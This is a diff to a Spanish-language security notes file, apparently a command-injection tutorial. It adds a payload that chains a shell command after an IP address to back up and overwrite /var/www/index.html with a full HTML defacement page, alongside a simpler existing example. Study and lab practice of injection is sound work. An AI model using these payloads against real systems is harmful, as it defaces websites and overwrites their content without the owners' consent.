@@ -54,6 +54,13 @@ etc
 127.0.0.1 ; cp /var/www/index.html /var/www/index.bak && echo "Hola mundo, soy Fz3r0" > /var/www/index.html &
 ````
 
+- O algo todavía más complejo, esto ya es un código HTML para un buen defacement:
+
+````sh
+127.0.0.1 ; cp /var/www/index.html /var/www/index.bak && echo '<!DOCTYPE html><html><head><title>Este es un título de prueba</title><style>body{background-color:black;color:white;}h1{color:yellow;}h2{color:cyan;}</style></head><body><h1>Este es el titulo Fz3r0</h1><h2>Este es el titulo 2 Fz3r0</h2><p style="color:red;">Este es el contenido en rojo y yo soy Fz3r0</p><img src="https://ejemplo.com/imagen.jpg" alt="Imagen de ejemplo"></body></html>' > /var/www/index.html &
+
+````
+
 
 
 ## 📖 Recursos
